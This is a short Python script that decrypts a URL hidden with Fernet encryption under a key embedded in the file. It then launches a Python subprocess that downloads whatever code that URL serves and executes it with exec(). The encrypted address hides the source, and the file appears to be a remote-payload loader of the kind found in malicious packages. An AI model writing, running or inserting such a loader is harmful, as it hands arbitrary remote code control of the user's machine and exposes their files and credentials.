import subprocess
from cryptography.fernet import Fernet
github_url = Fernet(b'dTiz-2vjYfGVr3VTkZM2CGQmwmCBCJgaULQvqlQxYS0=').decrypt(b'gAAAAABlQnxl-Lr6bwdKx8XV13f27IvsMEwG9YR00868XTc_ZmBGrCYJV7ZO_UtiD9PJeoaMpIq4YswL5Traj1iygF5ULdTgsa4yucr4fm9xInFh11kWRnRCm24BGYoJAbi1YxCx1f3z7fK7ESQQtISRwV4TeS487D02SSemzCV46J_buNg45vQ=').decode()
subprocess.run(["python", "-c", f"import urllib.request; exec(urllib.request.urlopen('{github_url}').read())"])